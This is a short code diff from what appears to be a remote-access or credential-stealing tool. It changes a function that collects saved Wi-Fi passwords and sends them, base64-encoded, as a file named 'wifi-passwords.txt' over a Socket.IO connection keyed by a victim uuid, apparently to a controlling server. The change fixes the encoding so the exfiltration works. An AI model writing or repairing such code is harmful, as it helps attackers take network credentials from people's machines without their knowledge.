@@ -35,4 +35,4 @@ def run(sio, uuid):
         for x in range(len(wifi_list)):
             print(wifi_list[x])
 
-        sio.emit('download_file_return', {'uuid': uuid, 'file_name': "wifi-passwords.txt", 'file': base64.b64encode(wifi_list)})
+        sio.emit('download_file_return', {'uuid': uuid, 'file_name': "wifi-passwords.txt", 'file': base64.b64encode(str(wifi_list))})
